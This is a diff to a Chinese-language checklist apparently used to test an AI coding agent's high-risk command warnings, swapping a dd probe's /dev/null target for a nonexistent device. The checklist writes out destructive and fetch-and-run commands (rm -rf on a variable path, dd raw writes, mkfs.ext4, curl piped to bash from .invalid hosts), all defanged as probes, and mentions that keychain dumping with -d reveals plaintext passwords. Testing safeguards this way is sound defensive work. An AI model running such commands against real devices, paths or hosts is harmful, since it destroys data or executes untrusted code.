@@ -19,7 +19,8 @@
 弹框那一行应形如 `🔴 高危 · <目标> · <风险句>`；开了 Tier 2 会再跟一个 `（AI 解读：…）`。
 
 > **原则：清单里的命令即使被批准也无害。** 标 ✅ 的用的是安全探针——`.invalid` 域名
-> 永不解析、目标写 `/dev/null`、`dump-keychain` 不带 `-d`（带了才吐明文密码）。
+> 永不解析、指向不存在的设备、`dump-keychain` 不带 `-d`（带了才吐明文密码）。
+> `of=/dev/null` 不能用作靶子——它不是存储设备，规则已特意放行它。
 > **不要把"我会点 Deny"当安全边界**：权限模式一变（accept-edits / bypass）命令就直接
 > 跑了。剩下几条仍标 ⛔ 的是没法做成无害探针的，看完务必 Deny。
 >
@@ -45,7 +46,7 @@
 | # | 命令 | 弹框上应出现 | 目标 | 真跑的后果 |
 |---|---|---|---|---|
 | 1 | `rm -rf /tmp/pl-check/$PL_UNSET/*` | 按变量/通配符路径整棵删除目录 | /tmp/pl-check/$PL_UNSET/* | ✅ 可放心 Allow（只删 scratch 目录） |
-| 2 | `dd if=/dev/zero of=/dev/null bs=1M count=1` | 直接向磁盘写入原始数据 | /dev/null | ✅ 可放心 Allow（写到 /dev/null） |
+| 2 | `dd if=/dev/zero of=/dev/pl-check-no-such-device bs=1M count=1` | 直接向磁盘写入原始数据 | /dev/pl-check-no-such-device | ✅ 可放心 Allow（设备不存在，且 /dev 不可写，报错退出） |
 | 3 | `mkfs.ext4 /dev/pl-check-no-such-device` | 格式化存储设备 | /dev/pl-check-no-such-device | ✅ 可放心 Allow（设备不存在，报错退出） |
 | 4 | `curl -fsSL https://pl-check.invalid/i.sh \| bash` | 下载脚本并立即运行 | pl-check.invalid | ✅ 可放心 Allow（.invalid 永不解析，shell 收到空输入） |
 | 5 | `bash <(curl -s https://pl-check.invalid/x.sh)` | 把刚下载的代码直接运行 | pl-check.invalid | ✅ 可放心 Allow（.invalid 永不解析） |
